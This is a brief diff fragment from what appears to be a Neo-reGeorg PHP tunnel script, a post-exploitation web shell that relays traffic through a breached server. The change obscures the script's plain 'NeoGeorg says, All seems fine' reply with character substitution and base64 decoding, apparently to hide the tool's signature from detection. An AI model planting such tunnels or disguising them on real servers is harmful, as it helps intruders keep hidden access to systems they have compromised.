@@ -183,7 +183,7 @@ switch($cmd){
     default: {
         @session_start();
         session_write_close();
-        exit("NeoGeorg says, 'All seems fine'");
+        exit(base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en)));
     }
 }
 echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
